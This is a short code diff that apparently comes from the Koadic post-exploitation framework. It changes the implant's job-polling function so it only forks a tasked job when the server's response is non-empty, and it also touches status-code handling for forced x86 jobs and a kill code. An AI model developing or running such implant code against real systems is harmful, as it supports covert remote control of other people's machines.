@@ -38,8 +38,10 @@ function DoWork()
         // 202 = force x86
         if (work.status == 201 || work.status == 202)
         {
-            var jobkey = work.responseText;
-            Koadic.work.fork(jobkey, work.status == 202);
+            if (work.responseText.length > 0) {
+                var jobkey = work.responseText;
+                Koadic.work.fork(jobkey, work.status == 202);
+            }
         }
         else // if (work.status == 500) // kill code
         {
